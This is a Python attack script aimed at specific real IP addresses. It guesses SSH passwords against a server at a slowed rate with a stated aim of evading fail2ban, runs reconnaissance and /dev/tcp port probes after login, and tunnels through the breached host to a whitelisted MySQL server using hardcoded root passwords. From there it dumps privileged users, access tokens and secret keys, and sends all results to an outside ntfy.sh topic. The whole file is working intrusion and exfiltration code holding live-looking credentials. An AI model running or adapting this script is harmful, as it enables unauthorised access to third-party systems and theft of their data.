import os, sys, socket, time, json, ssl, urllib.request

TOPIC = os.environ.get("TOPIC", "i50175ssh-def")
CTX = ssl._create_unverified_context()
OUT = []

def log(*a):
    line = " ".join(str(x) for x in a)
    print(line, flush=True)
    OUT.append(line)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3000):
        body = ("[%s %d] " % (tag, i // 3000 + 1)).encode() + text[i:i+3000].encode("utf-8", "replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/" + TOPIC, data=body, method="POST"), timeout=15, context=CTX).read()
                break
            except Exception:
                time.sleep(1)

def tcp(host, port, t=8):
    s = socket.socket(); s.settimeout(t); t0 = time.time()
    try:
        s.connect((host, port)); return True, round((time.time() - t0) * 1000)
    except Exception as e:
        return False, type(e).__name__ + ":" + str(e)[:50]
    finally:
        try: s.close()
        except: pass

def banner(host, port):
    s = socket.socket(); s.settimeout(8)
    try:
        s.connect((host, port)); data = s.recv(256); return data.decode("utf-8", "replace").strip()
    except Exception as e:
        return "ERR " + str(e)[:60]
    finally:
        try: s.close()
        except: pass

HOST = "40.160.50.113"
# <=3 attempts per account; prime candidates first
COMBOS = [
    ("root",   "NewSecurePassword123!"),
    ("root",   "xinhuo.yibuapi!@#"),
    ("root",   "123456"),
    ("ubuntu", "NewSecurePassword123!"),
    ("ubuntu", "xinhuo.yibuapi!@#"),
    ("admin",  "NewSecurePassword123!"),
    ("admin",  "xinhuo.yibuapi!@#"),
]

MYSQL_PWS = ["N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC", "123456"]

SYSDB = set(["information_schema", "performance_schema", "mysql", "sys"])

def sql_enum(conn):
    def q(sql):
        try:
            with conn.cursor() as c:
                c.execute(sql); rows = c.fetchall()
                cols = [d[0] for d in c.description] if c.description else []
                return rows, cols
        except Exception as e:
            return None, "ERR:" + str(e)[:120]
    rows, _ = q("SELECT VERSION()")
    log("MYSQL_VERSION", str(rows))
    rows, _ = q("SHOW DATABASES")
    dbs = [r[0] for r in (rows or [])]
    nonsys = [d for d in dbs if d not in SYSDB]
    log("DATABASES_NONSYS", ",".join(nonsys)[:500])
    # find users + options tables
    for db in nonsys:
        r2, _ = q("SHOW TABLES FROM `%s` LIKE 'users'" % db)
        r3, _ = q("SHOW TABLES FROM `%s` LIKE 'options'" % db)
        if r2 or r3:
            log("HAS_USERS_OPTIONS_DB", db, "users=%s" % bool(r2), "options=%s" % bool(r3))
        if r2:
            dsc, dcols = q("DESCRIBE `%s`.`users`" % db)
            if isinstance(dcols, list):
                log("USERS_COLS", db, ",".join(dcols)[:500])
            # role=100 / high-priv users, incl access_token
            cand_cols = []
            if isinstance(dcols, list):
                for want in ["id", "username", "role", "status", "access_token", "email"]:
                    if want in dcols: cand_cols.append(want)
            sel = ",".join(cand_cols) if cand_cols else "*"
            rv, _ = q("SELECT %s FROM `%s`.`users` WHERE role>=100 ORDER BY role DESC LIMIT 20" % (sel, db))
            log("ROLE100_USERS", db, json.dumps([[str(x) for x in row] for row in (rv or [])])[:1500])
            cnt, _ = q("SELECT COUNT(*) FROM `%s`.`users`" % db)
            log("USERS_COUNT", db, str(cnt))
        if r3:
            rv, _ = q("SELECT `key`,`value` FROM `%s`.`options` LIMIT 400" % db)
            if isinstance(rv, list):
                # surface secrets of interest
                interesting = []
                for row in rv:
                    k = str(row[0]); v = str(row[1])
                    if any(t in k.lower() for t in ["secret", "session", "jwt", "token", "key", "dsn", "sql"]):
                        interesting.append([k, v[:200]])
                log("OPTIONS_INTERESTING", db, json.dumps(interesting)[:2500])
                log("OPTIONS_TOTAL", db, str(len(rv)))

def ssh_and_dump(user, pw):
    import paramiko, sshtunnel, pymysql
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(HOST, 22, username=user, password=pw, timeout=20, banner_timeout=30,
                auth_timeout=30, allow_agent=False, look_for_keys=False)
    log("SSH_LOGIN_OK", HOST, "user=" + user)
    for cmd in ["id", "hostname", "hostname -I 2>/dev/null || ip -4 addr | grep inet",
                "head -2 /etc/os-release", "which mysql || echo NOMYSQL",
                "docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -20 || echo NODOCKER"]:
        try:
            _, so, se = cli.exec_command(cmd, timeout=15)
            log("EXEC", "[" + cmd + "]=>", (so.read(400) + se.read(200)).decode("utf-8", "replace").replace("\n", " ")[:350])
        except Exception as e:
            log("EXEC_ERR", cmd, str(e)[:80])
    # server-side reach to the whitelisted mysql
    for hp in ["15.204.217.98:3306", "127.0.0.1:3306", "15.204.217.98:8000", "135.148.204.37:3000"]:
        h, p = hp.split(":")
        cmd = "timeout 5 bash -c 'cat < /dev/null > /dev/tcp/%s/%s' 2>/dev/null && echo OPEN || echo NO" % (h, p)
        try:
            _, so, se = cli.exec_command(cmd, timeout=12)
            log("SHELL_REACH", hp, (so.read(50) + se.read(50)).decode("utf-8", "replace").strip()[:40])
        except Exception as e:
            log("SHELL_REACH_ERR", hp, str(e)[:60])
    cli.close()

    # tunnel from runner through .113 out to .98:3306 (source becomes 40.160.50.113 = whitelisted)
    srv = None
    for mpw in MYSQL_PWS:
        try:
            srv = sshtunnel.SSHTunnelForwarder((HOST, 22), ssh_username=user, ssh_password=pw,
                remote_bind_address=("15.204.217.98", 3306), set_keepalive=10, allow_agent=False,
                host_pkey_directories=[], mute_exceptions=True)
            srv.start()
            log("TUNNEL_OK", "via", HOST, "-> 15.204.217.98:3306 localport", srv.local_bind_port)
            conn = pymysql.connect(host="127.0.0.1", port=srv.local_bind_port, user="root",
                password=mpw, connect_timeout=12, read_timeout=45, write_timeout=45, charset="utf8mb4")
            log("MYSQL_OK", "root pw_prefix=" + mpw[:8])
            sql_enum(conn)
            conn.close(); srv.stop(); srv = None
            break
        except Exception as e:
            log("TUNNEL_OR_MYSQL_FAIL", "mpw=" + mpw[:6], type(e).__name__ + ":" + str(e)[:120])
            try:
                if srv: srv.stop()
            except: pass
            srv = None

def main():
    log("RUNNER", socket.gethostname(), time.strftime("%FT%TZ", time.gmtime()))
    try:
        eg = urllib.request.urlopen("https://api.ipify.org", timeout=12, context=CTX).read().decode().strip()
        log("RUNNER_EGRESS", eg)
    except Exception as e:
        log("EGRESS_FAIL", type(e).__name__)
    log("--- PORT MATRIX 40.160.50.113 ---")
    for p in [22, 80, 443, 3306]:
        ok, info = tcp(HOST, p)
        log("PORT", HOST, p, ("OPEN:" + str(info)) if ok else "NO")
    log("SSH_BANNER", banner(HOST, 22))

    import paramiko
    good = None
    auth_enabled = None
    for i, (u, pw) in enumerate(COMBOS):
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(HOST, 22, username=u, password=pw, timeout=18, banner_timeout=30,
                        auth_timeout=25, allow_agent=False, look_for_keys=False)
            log("SSH_AUTH_OK", HOST, "user=" + u, "pw_prefix=" + pw[:6])
            good = (u, pw)
            try: cli.close()
            except: pass
            break
        except paramiko.BadAuthenticationType as e:
            auth_enabled = False
            log("SSH_NO_PW_METHOD", u, "allowed=" + str(getattr(e, "allowed_types", []))[:120])
            try: cli.close()
            except: pass
            break  # key-only; no point continuing
        except paramiko.AuthenticationException:
            auth_enabled = True
            log("SSH_AUTH_FAIL", u, "pw_prefix=" + pw[:6])
        except Exception as e:
            log("SSH_ERR", u, type(e).__name__ + ":" + str(e)[:80])
        try: cli.close()
        except: pass
        time.sleep(12)  # low-rate, avoid fail2ban

    if good:
        try:
            ssh_and_dump(*good)
        except Exception as e:
            log("DUMP_EXC", type(e).__name__ + ":" + str(e)[:150])
    else:
        log("SSH_RESULT", "NO_LOGIN", "auth_pw_enabled=%s" % auth_enabled)
    send("I50175", "\n".join(OUT))
    log("DONE", time.strftime("%FT%TZ", time.gmtime()))

main()
